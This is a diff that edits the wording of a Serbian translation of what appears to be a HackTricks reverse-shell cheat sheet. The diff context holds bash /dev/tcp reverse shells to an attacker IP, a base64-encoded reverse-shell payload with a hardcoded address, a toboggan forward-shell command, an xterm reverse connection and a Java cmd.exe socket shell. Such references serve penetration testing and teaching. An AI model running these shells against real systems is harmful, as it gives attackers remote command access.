@@ -19,7 +19,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Full TTY
 
-**Kada dobijete reverznu ljusku**[ **pročitajte ovu stranicu da biste dobili pun TTY**](full-ttys.md)**.**
+**Kada dobijete reverznu ljusku**[ **pročitajte ovu stranicu da dobijete pun TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -34,9 +34,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Не заборавите да проверите и друге шелове: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh и bash.
+Ne zaboravite da proverite sa drugim shell-ovima: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
 
-### Симбол безбедан шел
+### Siguran simbol shell
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -49,8 +49,8 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 
 1. **`bash -i`**: Ovaj deo komande pokreće interaktivnu (`-i`) Bash ljusku.
 2. **`>&`**: Ovaj deo komande je skraćena notacija za **preusmeravanje standardnog izlaza** (`stdout`) i **standardne greške** (`stderr`) na **istu destinaciju**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP vezu sa navedenom IP adresom i portom**.
-* Preusmeravanjem izlaza i grešaka na ovaj fajl, komanda efikasno šalje izlaz interaktivne sesije ljuske na napadačevu mašinu.
+3. **`/dev/tcp/<NAPADAČ-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP vezu sa navedenom IP adresom i portom**.
+* Preusmeravanjem izlaza i grešaka na ovaj fajl, komanda efikasno šalje izlaz interaktivne sesije ljuske na mašinu napadača.
 4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na istu destinaciju kao standardni izlaz (`stdout`)**.
 
 ### Kreiraj u fajlu i izvrši
@@ -92,7 +92,7 @@ return response.text
 ```shell
 toboggan -m nix.py -i
 ```
-Da biste direktno iskoristili interaktivnu ljusku. Možete dodati `-b` za Burpsuite integraciju i ukloniti `-i` za osnovniji rce omotač.
+Da direktno iskoristite interaktivnu ljusku. Možete dodati `-b` za Burpsuite integraciju i ukloniti `-i` za osnovniji rce omotač.
 
 Druga mogućnost je korišćenje `IppSec` forward shell implementacije [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
@@ -309,7 +309,7 @@ Ovo će pokušati da se poveže sa vašim sistemom na portu 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Da biste uhvatili reverse shell, možete koristiti (koji će slušati na portu 6001):
+Da biste uhvatili reverznu školjku, možete koristiti (koja će slušati na portu 6001):
 ```bash
 # Authorize host
 xhost +targetip
@@ -325,7 +325,7 @@ int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## References
+## Reference
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
